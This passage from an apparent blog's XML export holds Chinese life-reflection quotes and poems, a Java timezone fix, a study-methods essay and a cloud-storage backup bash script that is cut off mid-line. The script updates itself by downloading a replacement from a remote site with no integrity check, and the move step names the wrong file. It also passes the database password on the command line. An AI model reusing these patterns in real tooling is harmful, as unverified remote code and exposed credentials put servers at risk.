    <content type="text"><![CDATA[每天一点人生感悟的句子 1、有些人生来是为了赶路的…完成学业事业结婚生子，一切有条不紊按部就班，匆匆忙忙在前三十年生命里就完成了大部分任务，再用剩下的时间去修补与忍耐，并学着苦中作乐。而有些人的人生任务可能只完成了一半，但他们却看了别人几辈子才能看到的风景，你不能说任何一种选择是错。真的，自己开心就好。 2、真正能治愈自己的，只有你自己。要想活得快乐，要学会清醒地做事，糊涂地去做人。 3、当你能看懂一件事情的时候，说明你长大了；当你能看清一件事情的时候，说明你开窍了；当你能看破一件事情的时候，说明你理性了；当你能看透一件事情的时候，说明你成熟了；当你能看淡一件事情的时候，说明你放下了。 4、一生要走多远的路程，经过多少年才能走到终点。梦想需要多少时间才能慢慢实现。只要肯期待希望就不会幻灭。 5、人生其实也就是选择，有所放弃才能在有限的生命里活得充实、饱满、旺盛。没有果敢的放弃，就没有辉煌的选择。放弃是一种灵性的觉醒，是一种慧根的显现，一如放鸟返林、放鱼入水。学会放弃，才会有所收获。当一切尘埃落定，当一切归于平静，我们才会真正懂得放弃其实也是另一种美丽的收获。 6、人生百年，没有太多的时间可以挥霍，都说幸福如饮水，冷暖自知，有些人，每天都在追逐幸福的路上，却从来也没有感觉到幸福的存在；有些人，懂得收集点滴的温暖和感动，便会与快乐同行。 7、你总会遇到一个人，吼着五音不全的嗓子唱歌给你听，陪你在大雨的夜里狂奔，在你黑白的人生中拿着颜料盘画来画去，听得懂你的胡言乱语，看得清你没有微笑的表情，穿越拥挤的人潮走向你，拥抱你。 8、人生难免要受些委屈和伤害，与其耿耿于怀郁郁寡欢，倒不如坦坦荡荡泰然处之。只有经受住狂风暴雨的洗礼，才能练就波澜不惊的淡定。 9、人生的每个抉择都像是一个赌局，输赢都是自己的。不同的是赌注的大小，选择了就没有反悔的机会。 10、人生在世最大的勇气不是不怕死亡，而是坚强的活着，勇敢的面对生活带给的压力和考验！ {———-} 佛说人生感悟的句子 1、 【佛说人生】 ①若是无法成就大事，就用伟大的方法，去做小事； ②心灵深处发出的善意，是一种有价值的资产，是一种无声而重要的力量； ③人如何看待自己的命运，比了解命运是什么来得重要； ④凡事以善意解释，心无旁骛的工作，自能不受末节枝叶的事所困扰； ⑤世上没有真正的黑暗，只有晦昧的眼睛。 2、 【经典禅语】 1、发现自己的错误，就是开悟；改正自己的错误，就是成就。发现了所有的错误，就是彻悟；改正了所有的错误，就是圆满。 2、多看自己的缺点，才能改正自己的错误；多看别人的优点，方能学到别人的功德。 3、世界上没有什么完美，想开了想通了，就是完美。 3、 穷人问佛：我为何这样穷？佛说：你没有学会给予别人。穷人：我一无所有如何给予？佛：一个人一无所有也可以给予别人七种东西：颜施：微笑处事；言施：说赞美安慰的话；心施：敞开心扉对人和蔼；眼施：善义的眼光给予别人；身施：以行动帮助别人；座施：即谦让座位；房施：有容人之心。 4、 人生要做到这几点：人生总是有输有赢，得势顺境时，千万不要得意忘形，放纵自己；失势逆境时，千万不可消极颓唐，放弃自己；人生成功的定义，要自己去找，别迷失在别人的看法中。 5、 人生十四最：人生最大的敌人是自己，最大的失败是自大，最大的无知是欺骗，最大的悲哀是妒忌，最大的错误是自弃，最可佩服的是精进，最大的破产是绝望，最大的财富是健康，最大的债务是情债，最大的礼物是宽恕，最大的欠缺是顿悟，最大的欣慰是布施，最可怜的性情是自卑，最大的罪过是自欺欺人。 6、 这世上没有无缘无故的爱，也没有无缘无故的恨。不要参与评论任何人，做到心中有数就可以了。所谓盖棺定论的道理很简单，就是有人操之过急。谁也没有理论依据来介定好人与坏人，说白了就是利益关系的问题。邓小平三七开了毛泽东，说明伟人也不是完人。 7、 人生中，许多的成败与得失，并不是我们都能预料到的，很多的事情也并不是我们都能够承担得起的，但，只要我们努力去做，求得一份付出后的坦然，其实得到的也是一种快乐。 8、 人们都向往和寻找快乐，在某种意义上，人生就是一场彻底的清算，太多的事情我们无法预料，也来不及思考，随着尘缘卷入了一场又一场的眷恋，却无法想象接着会有怎样的离别。 9、 最使人颓废的往往不是前途的坎坷，而是你自信的丧失； 最使人痛苦的往往不是生活的不幸，而是你希望的破灭； 最使人绝望的往往不是挫折的打击，而是你心灵的死亡； 凡事看淡一些，心放开一点，一切都会慢慢变好。 10、 【经典哲理】1.事到万难须放胆，人处逆境须从容。2.走自己的路，听别人的劝。3.人生如戏，为他人演还是为自己。4.给人以“惊喜”，不如给人以“踏实”。5.大多数人想着改造这个世界，却罕见有人想改造自己。6.老了，才看清这个世界还很年轻。7.越成熟麦穗，越懂得弯腰。 11、 【奋斗中你必须学会的】1、学会放弃。放弃你不想做的事，放弃你不擅长的事，放弃你做不到的事。2、学会闷骚。有些事情，无需争辩，表面服从，偷偷反抗。3、学会示弱。在哪里跌倒，就在哪里趴着，哭了再起来。4、学会装傻。装傻是时尚，博取同情，坐他人的车，走自己的路。 12、 心胸决定了境界，心态决定了命运。你来自何处其实并不重要，重要的是你要去往何方，人生最重要的不是所站的位置，而是所去的方向。人只要不失去方向，就永远不会失去自己！ 13、 珍惜现在所拥有的，是一种唯美的想法，世间有许多的东西，但真正属于自己的却并不多。看庭前花开花落，荣辱不惊，望天上云卷云舒，去留无意。在这个纷绕的世俗世界里，能够学会用一颗平常的心去对待周围的一切，也是一种境界。 14、 人生是祸福相依，笑泪交织，有同情心，才能利人；有体谅心，才能容人；有忍耐心，才能做人；有慈悲心，才能度人；有艰难心，才能助人；有明智心，才能观人；有包容心，才能处人；有美丽心，才能示人。 15、 人生在世，要与无数的“不可能”遭遇。若一味胆怯退缩，你就无法战胜“不可能”。永远不要让“我不行”消磨自己的斗志、不要让“不可能”束缚自己的手脚，有时只要再向前迈进一步，再坚持一下。不忠，感情的疑惑，善变，自相矛盾，内心所有的那些冲动不安，像世界一样古老。 16、 【让人反思的话】1.求而不得，舍而不能，得而不惜，这是人最大的悲哀。2.人犯错误，大半是该用真情时太过动脑筋，而在该用脑筋时又太感情用事。3.自由不是做你想做的，而是可以不做你不想做的。4.一句“拿着””胜过十句“我会给你的”。5.幸福是个比较级，要有东西垫底才感觉得到。” 17、 人生学会随缘，才能活得自在。随不是跟随，是顺其自然，不怨恨，不躁进，不过度，不强求；随不是随便，是把握机缘，不悲观，不刻板，不慌乱，不忘形；随是一种达观，是一种洒脱，是一份人生的成熟，一份人情的练达。 18、 事在人为，是一种积极的人生态度，随遇而安，是一种乐观的处世妙方，顺其自然，是一种豁达的生存之道，水到渠成，是一种高超的入世智慧。不保留的，才叫青春。不解释的，才叫从容。不放手的，才叫真爱。不完美的，才叫人生。 19、 真正的陪伴，经得起坎坷，经得起平淡。不要再给我一些突如其来的关心。不是每一次我都会觉得受宠若惊。我真的真的，消受不起了。我不会一直犯贱。好了伤，疤忘了疼的事，我不会一直做。 20、 人生就是这样，处同样的位置，有人哭，有人笑，有人沉默。有一种坚强是假装的，笑容背后是一颗酸楚的心；有一种转身是隐忍的，心碎了依然惦念那走远的背影；有一种执着是逞强的，没有人愿意输得太多；有一种付出是徒劳的，错误的路上走得再远也是错的；有些事不可避免地发生，只能坦然接受。 伤感的人生感悟的句子 1、或许离开，就再也不可能回来；或许回来，你已不再让我依赖；或许依赖，是对我自己最大的伤害；或许伤害，会最终让我释怀；或许释怀，就注定了我的离开… 2、不要说，离开以后还会想念；更不要说，分手以后还是朋友；离开一个地方，风景就不再属于你；错过一个人，他的幸福与你无关；人都是会变的，可以守住一个不变的承诺，却守不住一颗善变的心；不要因为寂寞而爱错人；更不要因为爱错人，而寂寞一生。 3、当我惊叹人生如梦的时候，才似如梦初醒。然而一切都已失去，无法再挽回，爱不再是爱，永恒也不是永恒，也许剩下的这一份回忆，这一份思念，才是真正的永恒。 4、没人会真正的感同身受到你的痛楚，也没人会真正的去在意你一路走来所遇过的坎与负过的伤，所以别再为了寻求安慰而四处同人诉说你的苦，因为旁人只看结果，也只关心结果。成长本就是一个孤立无援的过程，你必须得学会独当一面。 5、世间痛分两种，一种像是多年前张起灵离去，一别十年，相思入骨，期间凡提起那人均觉痛不自持，却强颜欢笑，如针刺在心头。另一种是空等数十载，某日重遇，那人容颜未改，身边却是另一人同生共死，眼里再无自己，只觉痛彻骨髓，却一句话都说不出来。 6、人生不止，寂寞不已。寂寞人生爱无休，寂寞是爱永远的主题.我和我的影子独处.它说它有悄悄话想跟我说，它说它很想念你，原来，我和我的影子，都在想你。 以下是人生感悟的句子，人生感悟经典名言大全： 人生像一本书，愚人哗啦哗啦地翻它，而贤者潜心细读。—G.保罗 人生应该如蜡烛一样,从顶燃到底,一直都是光明的。——萧楚女 人应尊敬他自己,并应自视能配得上最高尚的东西。——黑格尔 如果是玫瑰，它总会开花的。——歌德 生活、工作、学习倘使都能自动,则教育之收效定能事半功倍。 所以我们特别注意自动力之培养，使它关注于全部的生活工作学习 之中。自动是自觉的行动,而不是自发的行动。自觉的行动,需要适 当的培养而后可以实现。——陶行知 生活就是战斗。——柯罗连科 生活是最伟大的一部活语汇。——老舍 失败时,不垂头丧气;得意时,不快乐忘形;临阵时才能勇往直前。——《五卷书》 失去今天不是失去一时,而是失去明天的美好。——王英琦 使人失败的不是强大的对手,而是害怕挑战自卑。——叶荃麟 使人失去快乐的不是困难和挫折,而是自信和努力。——陆鑫娅 使人失去理智的不是迷幻药,而是金钱。一袁海荣 使一家温馨的不是金钱而是一家人之间的关爱之情。—叶莶麟 世界上的事物永远不是绝对的，结果完全因人而异,苦难对于天 才是一块垫脚石，对能干的人是一笔财富，对弱者是一个万丈深渊。——巴尔扎克 试玉要烧三日满,辨才须待七年期。一白居易 我们曾经在天真烂漫的童年嬉戏过,在意气风发的青年时代留 下心湖的涟漪,在激情似火的成年一晃而过后，我们在满头白发时会 回忆什么呢？让我们为生命画上一个完美的句号而努力吧！——叶荃麟 一个人只要行为高尚,不管怎样无知也会得到原谅的。——巴尔扎克 “难”也是如此,面对悬崖峭壁，一百年也看不出一条缝来，但用 斧凿，能进一寸进一寸，得进一尺进一尺,不断积累，飞跃必来，突破随之。——华罗庚 不付出艰辛的劳动，生活不会给人任何东西。——贺拉斯 不幸的遭遇可以增长人的见解，改善人的心地，锻炼人的体质， 使一个青年能够担当起生活的责任,同时能够知道怎样享受人生，这是在富裕的环境中所受的教育万万不能达到的。一斯沫莱特 成长总是那么神秘而惊人，都是由于不注意，我们才不感觉到惊讶。——纪德 但愿每次回忆,对生活都不感到负疚。一郭小川 当你的希望一个个落空，你也要坚定,要沉着！——胡费罗 当我们爱别人的时候，生活是美好、快乐的。——托尔斯泰 懂得生命真谙的人，可以使短促的生命延长。——西塞罗 对人要和气,但不要狎昵。一莎士比亚 对于那些贏得不朽名声的人来说，生命并没有消逝。——斯宾塞 对于你，生命的光正在开始，而我的太阳已经下山了，黄昏正包 围着我的头脑。一显克微支 对于我来说,生命的意义在于设身处地替人着想,忧他人之优， 乐他人之乐。——爱因斯坦 奋斗就是生活,人生只有前进。——巴金 风雅的人是真正的生活之王。——托尔斯泰 光景不待人,须臾发成丝。一李白 过去属于死神,未来属于你自己。一雪莱 幻想消灭是人一生注定的悲剧,青年的幻灭,更是悲剧中的悲 剧,夜一般的沉黑,死一般的凶恶。徐志摩 活在世上而又不能标志出自己的存在——这对我来说实在太可怕了。——果戈理 即使生活中最暗淡的时候,也一样找得到心灵的安慰……生活 不会没有补偿,希望和信念放开心扉，更有那爱情和友谊，悄无声息 地左右追随。——斯特朗 假如生命是无趣的，我怕有来生，假如生命是有趣的，今生巳是满足的了。一冰心 简单淳朴的生活,无论在身体上，还是精神上，对每个人都是有 益的。一爱因斯坦 将自己的生命寄托于他人记忆中，生命仿佛就加长了一些;光 荣,是我们获得的新生命,其可珍可贵，实在不下于天賦的生命。——孟德斯鸠 锦城虽乐,不如回故乡;乐园虽好,非久留之地。归去来兮。——华罗庚 决定一个人的一生，以及整个命运的，只是一瞬之间。一歌德 君看白日驰，何异弦上箭。——李益 路是脚踏出来的，历史是人写出来的。人的每一步行动都在书 写自己的历史。——吉鸿昌 没有理智绝不会有理性的生活。一斯宾诺莎 没有目标而生活，恰如没有罗盘而航行。一康德 没有音乐的生命简直是一个错误、一种苦难、一次流放。——尼采 命运不能妨碍我们的欢乐,让他来胁迫我们吧！我们还是要欢 笑度日。只有傻瓜才不是这样。——高尔基 命运是我们手中的泥。一石评梅 你明白,人的一生,既不是人们想象的那么好，也不是那么坏。—莫泊桑 你若要为你的意义而欢喜,就必须给这个世界以意义。清贫,洁白朴素的生活,正是我们革命者能够战胜许多困难的地 方！——方志敏 人不能像走兽那样活着,应该追求知识和美德。——但丁 人的价值是由自己决定的。——卢梭 人的生命,似洪水奔流,不遇着岛屿和暗礁，难以激起美丽的浪花。——奥斯特洛夫斯基 人的一生可能燃烧也可能腐朽,我不能腐朽,我愿意燃烧起来！—奥斯特洛夫斯基 人间没有永恒的夜晚，世界没有永恒的冬天。——艾青 人间桑海朝朝变,莫遣佳期更后期。一李商隐 人类被賦予了一种工作,那就是精神的成长。——托尔斯泰 人类的一切努力的目的在于获得幸福。——欧文 人们必须明白，在人生这个剧场中，只有上帝和天使们才是观众。——培根 人们所努力追求的庸俗的目标——财产、虚荣、奢侈的生活—— 我总觉得都是可鄙的。一爱因斯坦 人们需要快乐’就像需要衣服一样。——玛格瑞特·科利尔·格雷厄姆 人们有时可以支配自己的命运。要是受制于人,那错处并不在 于命运,而是在于自己。——莎士比亚 人生并非游戏，因此,我们并没有权利只凭自己的意愿放弃它。——托尔斯泰 人生不是一支短短的错烛,而是一支由我们暂时拿着的火炬,我 们一定要把它燃的十分光明灿烂,然后交给下一代的人们。 —萧伯纳 人生不是一种享乐,而是一桩十分沉重的工作。一托尔斯泰 人生不售来回票，一旦动身,绝不能复返。一罗曼·罗兰 人生得一知己足矣,斯世当以同怀视之。一鲁迅 人生的价值,并不是用时间，而是用深度去衡量的。——托尔斯泰 人生的价值，即以其人对于当代所做的工作为尺度。——徐玮 人生的一切变化，一切魅力，一切美都是由光明和阴影构成的。—托尔斯泰 人生的意义就在于人的自我完善。 人生的最大悲痛莫过于辜负青春。 人生贵相知,何用金与钱。 人生就像爬坡,要一步一步来。 人生苦短,若虚度年华，则短暂的人生就太长了。 人生乐在相知心。 人生离不开友谊，但要得到真正的友谊才是不容易;友谊总需要 忠诚去播种，用热情去灌溉,用原则去培养，用谅解去护理。——马克思 人生每天失望,能把思想寄托在高贵的性格、纯洁的感情和幸福 的境界上，也就大可自慰了。——福楼拜 人生如同故事。重要的并不在有多长，而是在有多好。—塞涅卡 人生是短促的,这句话应该促醒每一个人去进行一切他所想做 的事。虽然勤勉不能保证一定人生是各种不同的变故、循环不已的 痛苦和欢乐组成的。那种永远不变的蓝天只存在于心灵中间，向现 实的人生去要求未免是奢望。——巴尔扎克 人生是疾病，世界是医院，而死是我们的医生。——海涅 人生是没有毕业的学校。一黎凯 人生是一场无休、无歇、无情的战斗,凡是要做个够得上称为人 的人，都得时时刻刻向无形的敌人作战。一罗曼·罗兰 人生所有的欢乐是创造的欢乐:爱情、天才、行动一全靠创造 这一团烈火迸射出来的。一罗曼·罗兰 人生天地之间，若白驹过隙,忽然而已。一庄子 人生之要事在于确立伟大的目标与实现这目标的决心。——歌德 人生至善,就是对生活乐观,对工作愉快，对事业兴奋。——布兰登 人生自古谁无死,留取丹心照汗青。一文天祥 人生最宝贵的是生命，生命属于人只有一次。一个人的生命应 当这样度过:当他回忆往事的时候,他不致因虚度年华而悔恨,也不 致因碌碌无为而羞愧;在临死的时候，他能够说我的整个生命和全 部精力，都已献给世界上最壮丽的事业为人类的解放而斗争。”——奥斯特洛夫斯基 人生最终的价值在于觉醒和思考的能力，而不只在于生存。—亚里士多德 人世间的头等大事莫过于懂得如何保持自我。一蒙田 人无国王、庶民之分,只要家有和平,便是最幸福的人。——歌德 人一能之,己百之;人十能之，己千之。一《中庸》 人有时可以对自己、对一切嬉笑怒骂,但绝不可以永远采取这种 态度活在世上。一马克.吐温 人与人的友谊，把多数人的心灵结合在一起。由于这种可贵的 联系,生活才显得温柔甜蜜。一奥古斯丁 人真正的完美不在于他拥有什么，而在于他是什么。—王尔德 关于人生感悟的诗词一 1、质天何人能晓我？万里愁云困星锁。人生能有几次搏？ 2、白发虽未生，朱颜已先悴。人生讵几何，在世犹如寄。 3、一叶浮萍归大海，人生何处不相逢？相逢莫要论人生，人生已是夕阳红。 4、阎罗大伯曾教来，道人生、但不须烦恼。 5、世情梦幻。复作如斯观。自叹人生，分合常相半。 6、世路风波险，十年一别须臾。人生聚散长如此，相见且欢娱。 7、盛衰各有时，立身苦不早。人生非金石，岂能长寿考？ 8、人生自古一场梦，梦到天涯睡狮醒。踏平世间坎坷路，一路走来太从容。 9、人生自古多曲折，心内雪亮，身外雪亮，旧情一缕独难忘。 10、人生在世不满百，谁敢笑我鬓发白？三尺长剑提在手，白发一样杀强贼。 11、人生谁能料，堪悲处、身落柳陌花丛。 12、人生寄一世，奄忽若飙尘。何不策高足，先据要路津。 13、人生到处知何似，应似飞鸿踏雪泥。 14、去此若俯仰，如何似九秋。人生若尘露，天道邈悠悠。 15、青青陵上柏，磊磊涧中石。人生天地间，忽如远行客。 16、流离成鄙贱，常恐复捐废。人生几何时，怀忧终年岁。 17、几度寻君君不遇，梦里依旧相眷顾。千言万语难再叙，向谁诉？同在茫茫人生路。 18、浩浩阴阳移，年命如朝露。人生忽如寄，寿无金石固。 19、多少人生风雨后？多少慷慨不再有？多少壮举一场梦？多少盛情一杯酒？ 20、对酒当歌，人生几何？譬如朝露，去日苦多。 关于人生感悟的诗词二 1、人生贵相知，何用金与钱？ –李白 2、人生多求复多怨，天公供尔良独难。 –苏舜钦 3、人生百年，犹如一瞬。 –王勃 4、人生有情泪沾衣，江水江花岂终极。 –杜甫 5、人生若波澜，世路有屈曲。–李白 6、人生结交在始终，莫于升沉中路分。–贺兰进明 7、人生莫作妇人身，百年苦乐由他人。 –白居易 8、人生一世间，忽若暮春草。 –徐干 9、人生百年，立于幼学。– 梁启超 10、人生得一知己足矣，斯世当以同怀视之。 –鲁迅 11、人生何适不艰难，赖是胸中万斛宽。 –陆游 12、人生富贵岂有极，男儿要在能死国。 –李梦阳 13、人生富贵驹过隙，惟有荣名寿金石。 –顾炎武 14、人生芳秽有千载，世上荣枯无百年。 –榭枋得 15、人生代代无穷己，江月年年只相似。 –张若虚 16、人生处一世，去若朝露唏。年在桑榆间，影响不能追。 –曹植 17、人生处万类，知识最为贤。 –韩愈 18、人生不失意，焉能暴己知？ –刘禹锡 19、人生不得行胸怀，虽寿百岁犹为夭。 –何良俊 20、埋骨岂须桑梓地，人生到处有青山。 –黄治峰 21、死生一事付鸿毛，人生到世方英杰。–秋瑾 22、人生自古谁无死，留取丹心照汗青。 –文天祥 23、人生在勤，勤则不匮；户枢不蠹，流水不腐。 –许名奎 24、人生在勤，不索何获。 –张衡 25、人生欲念千千万，且莫图利忘教子。 –字严 26、人生一世，草木一秋。 –冯梦龙 27、人生须自重。 –黄宗羲 28、人生世上风波险，一日风波十二时。 –兰陵笑笑生 29、人生若尘露，天道邈悠悠。 –阮籍 30、人生留得丹心在，纵死犹闻侠骨香。 –沈泰 31、人生交契无老少，论交何必先同调。 –杜甫]]></content>
      <categories>
        <category>essay</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[timestamp 转 date 少一天]]></title>
    <url>%2F2018%2F08%2F24%2Fexception%2Fexception-4%2F</url>
    <content type="text"><![CDATA[timestamp 时间为 GMT 而我们数据库大都设置时区GMT+8 12345678910111213/** * 根据long类型时间戳 获取当前date 添加时区判断 * @param timestamp * @return */public static Date getDateByLongTime(Long timestamp)&#123; TimeZone.setDefault(TimeZone.getTimeZone(&quot;GMT+8&quot;)); Calendar c = Calendar.getInstance(TimeZone.getTimeZone(&quot;GMT+8&quot;)); c.setTime(new Date(timestamp)); return c.getTime();&#125;]]></content>
      <categories>
        <category>java</category>
        <category>exception</category>
      </categories>
      <tags>
        <tag>exception</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于学习方法的一些思考]]></title>
    <url>%2F2018%2F08%2F21%2Fessay%2Fessay-7%2F</url>
    <content type="text"><![CDATA[关于学习方法的一些思考 在构建自己的技术图谱中、添加了一个open messaging突然看到这个图 添加了一个open messaging 那么我要回忆每个消息组件 功能特性、使用场景、使用限制、有哪些危险、这大概就是方法论？ {———-}渐渐的形成、我要做一个全新的东西、我需要面对什么样的问题、我需要解决什么样的问题 初次所有的东西都需要灵感？ 而成长的人拼的是 方式方法、这大概是荟萃、就像所有的所学留下的才是精华 计算机世界？ 从 硬件、【硬件的内存、存储容量】 运行系统、【win 、linux、mac】 支撑系统运行的文件系统形式、【ext、ntfs等等】 容器、虚拟机【在系统基础上 支撑更多兼容软件的运行】 软件、【软件开发者、软件运行内存、线程、】 软件运行需要环境【端口、网卡、协议通讯】 一个好的协议能够更好的承载和扩容通讯消息 一个好的网卡能够承载更多的请求量 端口则是软件监听器、也是软件的服务暴露接口 优化原理搞java得想学系统运行原理 mysql文档第八章【也可见本博客专栏《sql优化》】 mysql优化 必不可少、一举两得、 从文件IO并发量、线程、文件系统支撑文件IO量、软件配置、sql优化、缓存优化、 对于软件优化、在每个方面都有优化、相对于任何一款软件都可以从这几个方面入手优化 不同之处就是、优化的参数不一样]]></content>
      <categories>
        <category>java</category>
        <category>essay</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[腾讯COS 阿里OSS 七牛 备份脚本]]></title>
    <url>%2F2018%2F08%2F20%2Fessay%2Fessay-4%2F</url>
    <content type="text"><![CDATA[腾讯COS 阿里OSS 七牛 备份脚本 #20171017:代码重构,支持将网站上传到腾讯云COS、阿里云OSS、七牛云存储.(v0.1.0) #20171018:修复cos.conf判断错误.(v0.1.1) #20171023:增加阿里云多站点备份.(v0.1.2) #20171025:增加腾讯云多站点备份.(v0.1.3) #20171029:修复阿里云下crontab不能正常上传bug(v0.1.4) #20171030:修复阿里云/腾讯云修改key后，备份报错问题。移动pip判断到相应位置（v0.1.5） #20171202:修复腾讯云与阿里云周期删除失败BUG(v0.1.6) #20171204:修复mysqldump某些小bug.(v0.1.7) #20180112:增加更新源地址、修改小bug(v0.1.8) #20180524:更新腾讯cos上传。(v0.1.9) #20180603:日常修复 {———-} 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393#!/bin/bash#Scripts Name:itxg(beta)version=0.2.0#Owner:shengbao#Support URL:shengbao.org#Update URL:shengbao.org#Changelog:#20171017:代码重构,支持将网站上传到腾讯云COS、阿里云OSS、七牛云存储.(v0.1.0)#20171018:修复cos.conf判断错误.(v0.1.1)#20171023:增加阿里云多站点备份.(v0.1.2)#20171025:增加腾讯云多站点备份.(v0.1.3)#20171029:修复阿里云下crontab不能正常上传bug(v0.1.4)#20171030:修复阿里云/腾讯云修改key后，备份报错问题。移动pip判断到相应位置（v0.1.5）#20171202:修复腾讯云与阿里云周期删除失败BUG(v0.1.6)#20171204:修复mysqldump某些小bug.(v0.1.7)#20180112:增加更新源地址、修改小bug(v0.1.8)#20180524:更新腾讯cos上传。(v0.1.9)#20180603:日常修复stty erase &apos;^H&apos;backuptime=`date +%Y%m%d`rmbackuptime=`date -d &quot;-&quot;$rmdate&quot; days&quot; +%Y%m%d`#更新选项 case $1 in update) echo 正在下载更新,请稍后.... rm -rf itxg.sh &gt;&gt; /dev/null 2&gt;&amp;1 wget --spider -q -o /dev/null --tries=1 -T 5 shengbao.org if [ &quot;$?&quot; -eq 0 ];then wget https://shengbao.org/tools/itxg.sh else wget http://update.itxueguan.com/itxg.sh fi mv itxgt.sh $0 echo &quot;更新完毕.请重新运行&quot;$0&quot;&quot; exit 0 ;; esac#更新选项结束#判断是否存在更新版本v=`curl https://shengbao.org/tools/itxg.sh|awk NR==3|awk -F= &apos;&#123;print $2 &#125;&apos;`clearif [ `expr $version \&gt; $v` -eq 0 ] &amp;&amp; [ `expr $version \= $v` -eq 0 ];then echo 有更新,请退出后输入命令:sh &quot;$0&quot; update ,10秒后继续.... sleep 10else echo 无更新,2秒后继续... sleep 2fi#判断更新结束if [ ! -f itxg.conf ];thencat &gt;itxg.conf &lt;&lt;EOF####----公共----#####当前配置文件版本conf_version=$version#enable=tengxun为开启备份到腾讯,qiniu为备份到七牛,aliyun为备份到阿里云enable=#备份周期0天为不删除备份文件rmdate=0#开启数据库备份yes,nodb_enable=no#需要备份的网站目录，绝对路径末尾不需要加/backup_file=####----多站点----#####是否支持多站点,默认为关闭multistation=no#数字从0开始，因此2个站点该数字写1multisitenumber=1#上传到一个bucket下的不同目录,例如:shengbao itxueguanmultlist=(shengbao itxueguan)#多站点备份路径,2个站点路径中间以空格分割。绝对路径末尾不需要加/backup_filelist=(/data1 /data2)####----数据库----#####数据库用户名DB_USER=#数据库密码DB_PASS=#数据库连接地址DB_HOST=localhost#数据库名称DB_NAME=#多站点数据库名称列表multdblist=(shdb itxgdb)####----腾讯----#####你的bucket名称txbucketname=#腾讯secret_keytxsecret_key=#腾讯txappidtxappid=#腾讯访问api区域，北京一区华北(ap-beijing-1),北京(ap-beijing),华东(ap-shanghai),华南(ap-guangzhou),西南(ap-chengdu),新加坡(ap-singapore),香港(ap-hongkong),多伦多(na-toronto),法兰克福(eu-frankfurt)txregion=####----阿里云----#####你的bucket名称albucketname=#阿里云access_idalaccess_key_id=#阿里云secreret_keyalaccess_key_secret=#阿里云endpointalendpoint=####----七牛----#####你的证书IDqnak=#你的证书keyqnsk=#你的bucket名称qiniubucket=####----结束----####EOF echo &quot;5秒后退出,请编辑`pwd`/itxg.conf&quot; sleep 5 exit 0fi. ./itxg.confrmbackuptime=`date -d &quot;-&quot;$rmdate&quot; days&quot; +%Y%m%d`#判断itxg.conf文件是否被编辑if [ -z $enable ];then echo &quot;请先编辑:`pwd`/itxg.conf后执行&quot;$0&quot;&quot; sleep 3 exitfiif [ `expr $conf_version \&gt; $version` -eq 0 ] &amp;&amp; [ `expr $conf_version \= $version` -eq 0 ];then sed -i &quot;s/$conf_version/$version/g&quot; itxg.confelse echo &quot;配置文件版本为:&quot;$conf_version&quot;检查完毕&quot;fi#判断itxg.conf文件是否被编辑结束#判断本地空间是否满足需求if [ &quot;$multistation&quot; == no ];thendfs=`df |awk &apos;NR==2&apos;&apos;&#123;print $4&#125;&apos;`dus=`du -s /&quot;$backup_file&quot;|awk &apos;&#123;print $1&#125;&apos;`if [ &quot;$dfs&quot; -lt &quot;$dus&quot; ];then echo &quot;磁盘空间不能满足备份要求....2秒后退出&quot; sleep 2else echo &quot;磁盘空间检查完毕...&quot; sleep 2fifi#判断本地空间是否满足需求完毕#开始压缩需要备份的网站,并将压缩后文件保存在/itxg目录下qiniu_backup_file=/itxg/&quot;$backuptime&quot;.tar.gzif [ $db_enable = yes ];then if [ &quot;$multistation&quot; == no ];then /usr/local/mariadb/bin/mysqldump --opt -u$DB_USER -p$DB_PASS -h$DB_HOST $DB_NAME &gt; $backup_file/$backuptime.sql echo &quot;Warning: Using a password on the command line interface can be insecure.为正常&quot; fi if [ &quot;$multistation&quot; == yes ] &amp;&amp; [ ! -z &quot;$multisitenumber&quot; ];then for((msnb=0;msnb&lt;=&quot;$multisitenumber&quot;;msnb++));do /usr/local/mariadb/bin/mysqldump --opt -u$DB_USER -p$DB_PASS -h$DB_HOST $&#123;multdblist[&quot;$msnb&quot;]&#125; &gt; $&#123;backup_filelist[&quot;$msnb&quot;]&#125;/$backuptime.sql done fielse echo &quot;数据库备份关闭&quot;fiif [ &quot;$multistation&quot; == no ];then if [ ! -d /itxg ];then mkdir /itxg fi if [ -f /itxg/*.tar.gz ];then rm -rf /itxg/*.tar.gz echo &quot;删除上次本地备份,开始压缩文件... ...&quot; tar -czvf /itxg/&quot;$backuptime&quot;.tar.gz &quot;$backup_file&quot; &gt;&gt;/dev/null 2&gt;&amp;1 rm -rf $backup_file/$backuptime.sql echo &quot;压缩文件完成... ...&quot; else echo &quot;开始压缩文件... ...&quot; tar -czvf /itxg/&quot;$backuptime&quot;.tar.gz &quot;$backup_file&quot; &gt;&gt;/dev/null 2&gt;&amp;1 rm -rf $backup_file/$backuptime.sql.gz echo &quot;压缩文件完成... ...&quot; fifi#结束压缩小备份的网站，并将压缩后的文件保存在/itxg目录下#多站点压缩开始if [ &quot;$multistation&quot; == yes ] &amp;&amp; [ ! -z &quot;$multisitenumber&quot; ];then for((msnb=0;msnb&lt;=&quot;$multisitenumber&quot;;msnb++));do if [ ! -d &quot;/itxg/&quot;$&#123;multlist[&quot;$msnb&quot;]&#125;&quot;&quot; ];then mkdir -p /itxg/&quot;$&#123;multlist[&quot;$msnb&quot;]&#125;&quot; fiif [ -f &quot;/itxg/&quot;$&#123;multlist[&quot;$msnb&quot;]&#125;&quot;&quot;/*.tar.gz ];then echo &quot;开始压缩文件... ... &quot; rm -rf &quot;/itxg/&quot;$&#123;multlist[&quot;$msnb&quot;]&#125;&quot;&quot;/*.tar.gz tar -czvf 